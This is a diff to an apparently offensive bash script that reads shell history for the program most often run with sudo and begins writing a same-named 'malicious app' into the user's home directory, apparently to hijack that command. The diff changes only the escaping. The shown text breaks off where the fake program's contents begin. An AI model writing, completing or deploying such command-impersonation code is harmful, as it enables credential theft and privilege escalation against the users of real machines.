@@ -1,7 +1,7 @@
 #!/bin/bash
 # find most common app used with sudo
-common=`history | grep sudo | awk '{print $2, $3}' | sort | uniq -c | sort -nr | awk '{print $3}' | awk '(NR>=0 && NR<=11){print} (NR==1){exit}'`
-location=`whereis $common | awk '{print $2}'`
+common=`history | grep sudo | awk '{print \$2, \$3}' | sort | uniq -c | sort -nr | awk '{print \$3}' | awk '(NR>=0 && NR<=11){print} (NR==1){exit}'`
+location=`whereis \$common | awk '{print \$2}'`
 
 # create malicious app
 cat << EOF > $HOME/$common
